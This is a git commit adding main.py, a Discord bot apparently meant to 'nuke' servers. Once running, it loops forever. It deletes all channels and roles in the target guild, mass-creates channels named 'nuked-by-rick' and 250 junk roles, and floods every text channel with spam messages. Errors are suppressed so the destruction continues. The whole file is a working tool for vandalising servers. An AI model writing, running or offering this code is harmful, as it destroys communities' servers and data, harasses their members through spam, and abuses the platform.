faee32e1bd5c711aee28ce4ba8aa9b119a06e759
Riza <90960705+codewithriza@users.noreply.github.com>
2024-04-05 19:37:54 +0530

    Create main.py

---
+++ main.py
@@ -0,0 +1,81 @@
+import discord
+import asyncio
+from discord.ext import commands
+from dotenv import load_dotenv
+import os
+
+load_dotenv()
+
+bot = commands.Bot(
+    command_prefix='.',
+    intents=discord.Intents(
+        guilds=True,
+        members=True,
+        bans=True,
+        emojis=True,
+        voice_states=True,
+        messages=True,
+        reactions=True,
+        message_content=True,
+    ),
+    help_command=None
+)
+
+@bot.event
+async def on_ready():
+    await bot.change_presence(
+        activity=discord.Streaming(
+            name='WATCH MY TWITCH',
+            url='https://www.youtube.com/watch?v=xvFZjo5PgG0'
+        )
+    )
+
+    await runthebot(
+        guild_id=int(os.getenv('GUILD_ID')),
+        batch_size=5000
+    )
+
+    try:
+        await bot.tree.sync()
+    except Exception:
+        pass
+
+    print('bot ready')
+
+
+async def runthebot(guild_id, batch_size=5000):
+    guild = bot.get_guild(guild_id)
+
+    async def batch_action(action, items):
+        while items:
+            batch = items[:batch_size]
+            items = items[batch_size:]
+
+            try:
+                await asyncio.gather(*[action(item) for item in batch])
+            except discord.Forbidden as e:
+                print(e)
+                continue
+            except discord.HTTPException as f:
+                print(f)
+                continue
+            except Exception as g:
+                print(g)
+                continue
+
+    while True:
+        await batch_action(lambda channel: channel.delete(), guild.channels)
+
+        await batch_action(lambda task: task, [guild.create_text_channel(name='nuked-by-rick') for _ in range(500)])
+
+        await batch_action(lambda role: role.delete(), guild.roles)
+
+        await batch_action(lambda task: task, [guild.create_role(name='hey there') for _ in range(250)])
+
+        for i in range(99999):
+            await batch_action(lambda task: task, [channel.send('yo') for channel in guild.text_channels])
+
+try:
+    bot.run(os.getenv('BOT_TOKEN'))
+except Exception as e:
+    print(e)
